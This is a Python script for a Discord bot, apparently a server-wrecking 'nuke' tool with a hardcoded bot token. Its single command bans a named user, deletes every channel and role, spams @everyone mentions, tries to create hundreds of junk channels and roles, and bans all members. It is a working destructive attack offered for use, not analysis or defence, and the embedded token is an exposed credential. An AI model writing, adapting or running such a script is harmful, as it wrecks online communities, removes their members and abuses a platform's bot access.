print('Loading...')

import discord
from discord import *
from discord.ext import commands
import asyncio
import time
from discord import Permissions

import requests

bot_prefix = 'cbdf/'
bot_token = 'OTMwMTEwMzI2NzkwMzI0MjI1.YdxGvg.Jac5YvSpn-Z-TANt37Asg6P983Q'

channelname = 'YFHOIUDHJIOFHDIHGODFYO8GHSDOiofoihjdog8i5fg4f469g'
rolename = 'glfhfuhgifu'
reasonb = '0'

client = commands.Bot(command_prefix = f'{ bot_prefix }', intents=discord.Intents.all(), help_command=None, status=discord.Status.idle)

# Events
@client.event
async def on_ready():
	print('Bot Connected!')

@client.command()
async def aboba(ctx):
	print('Starting...')
	print()

	print('STARTED: Kick Lavan')
	try:
		lavan = client.get_user(704967695036317777)
		await ctx.guild.ban(lavan, reason = "0")
		await ctx.message.delete()
	except:
		print('ENDED: Kick Lavan')

	counter = 0
	print('RUNNED: Delete all channels')
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
		except: 
			print('ENDED: Delete all channels')
		else: 
			counter += 1

	print('RUNNED: Remove all roles')
	for m in ctx.guild.roles:
		try:
			await m.delete(reason="0")
		except:
			print('RUNNED: Remove all roles')

	for channel in ctx.guild.text_channels:
		try:
			await ctx.send("@everyone / @here\nJGFIUDHIGUHFHGF4gd848s64gf6d46g894f89.FGDGUYFUYDFG87Y6RG")
		except:
			print('Error: Failed to send')

	count1 = 0
	print('RUNNED: making channels #thank-you')
	try:
		while count1 < int(500):
			await ctx.guild.create_text_channel(count1 + 'thank-you')
			count1 += 1
	except:
		print('ENDED: making channels #thank-you')

	print('RUNNED: ban all')
	for m in ctx.guild.members:
		try:
			await m.ban(reason="0")
		except:
			print('ENDED: ban all')

	count2 = 0
	print('STARTED: Make role Hello_thanku')
	try:
		while count2 < int(500):
			await ctx.guild.create_role(name="Hello_thanku")
			count2 += 1
	except:
		print('ENDED: Make role Hello_thanku')

	print()
	print('Done')

client.run(bot_token)